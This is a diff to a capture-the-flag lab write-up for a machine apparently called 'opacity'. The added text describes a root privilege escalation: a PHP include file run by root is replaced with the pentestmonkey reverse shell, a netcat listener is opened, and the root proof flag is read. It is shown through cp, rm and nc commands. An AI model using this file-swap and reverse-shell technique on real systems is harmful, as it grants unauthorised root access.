@@ -223,7 +223,7 @@ another file within /lib:
 
 ![image](https://cdn-images-1.medium.com/max/1000/1*de31LzlghDjQ23FePAOh_Q.png)
 
-on script.php I have no permission to modiefy it, but if it uses another script, maybe can I 
+There is no permission to modifey script.php, but if it uses another script, maybe can I 
 modifey lib/backup.inc.php ?
 
 ```
@@ -232,7 +232,87 @@ modifey lib/backup.inc.php ?
 
 I can only read it.
 
-But, I'm the owner of /lib . what if Ill copy the directory to sysadmin home directory? I can modifey /lib/backup.inc.php there, then remove the original file from the original directory, the next step will be inject a reverse shell to the copied file and the last step is to move the file back to the original directory as modified file!
+But, I'm the owner of /lib . what if Ill copy the directory to sysadmin home directory? I can modifey /lib/backup.inc.php there, then remove the original file from the original directory, the next step will be inject a reverse shell to the copied file and the last step is to copy the file back to the original directory as modified file!
+
+first step:
+
+```bash
+sysadmin@opacity:~/scripts$ cp -r lib ../.
+```
+
+move to the copied lib directory:
+
+```
+sysadmin@opacity:~/lib$ ls -la
+total 132
+drwxr-xr-x 2 sysadmin sysadmin  4096 Mar 15 15:59 .
+drwxr-xr-x 7 sysadmin sysadmin  4096 Mar 15 15:59 ..
+-rw-r--r-- 1 sysadmin sysadmin  9458 Mar 15 15:59 application.php
+-rw-r--r-- 1 sysadmin sysadmin   967 Mar 15 15:59 backup.inc.php
+-rw-r--r-- 1 sysadmin sysadmin 24514 Mar 15 15:59 bio2rdfapi.php
+-rw-r--r-- 1 sysadmin sysadmin 11222 Mar 15 15:59 biopax2bio2rdf.php
+-rw-r--r-- 1 sysadmin sysadmin  7595 Mar 15 15:59 dataresource.php
+-rw-r--r-- 1 sysadmin sysadmin  4828 Mar 15 15:59 dataset.php
+-rw-r--r-- 1 sysadmin sysadmin  3243 Mar 15 15:59 fileapi.php
+-rw-r--r-- 1 sysadmin sysadmin  1325 Mar 15 15:59 owlapi.php
+-rw-r--r-- 1 sysadmin sysadmin  1465 Mar 15 15:59 phplib.php
+-rw-r--r-- 1 sysadmin sysadmin 10548 Mar 15 15:59 rdfapi.php
+-rw-r--r-- 1 sysadmin sysadmin 16469 Mar 15 15:59 registry.php
+-rw-r--r-- 1 sysadmin sysadmin  6862 Mar 15 15:59 utils.php
+-rwxr-xr-x 1 sysadmin sysadmin  3921 Mar 15 15:59 xmlapi.ph
+
+```
+
+next step:
+
+Inject php reverse shell pentestmonkey backup.inc.php
+
+modified it to your ip and port number.
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*kqg6jUisepfvfSxPj51rOA.png)
+
+third step:
+remove the original file from /scripts/lib/backup.inc.php
+
+```bash
+sysadmin@opacity:~/scripts/lib$ rm backup.inc.php
+```
+After that, copy the modified file back to /scripts/lib/ :
+
+```
+sysadmin@opacity:~/lib$ cp backup.inc.php /home/sysadmin/scripts/lib
+```
+
+set netcat listener:
+
+```bash
+nc -lnvp 1234
+```
+
+Then wait a little... and there is a shell as root!
+
+![image](https://cdn-images-1.medium.com/max/1000/1*JIdlS-DllYwzAhGuw5avuQ.png)
+
+Grab proof.txt flag.
+
+```bash
+cat /root/proof.txt
+```
+
+*Written by Alon Presman, Penetration Tester and Ethical Hacker.*
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
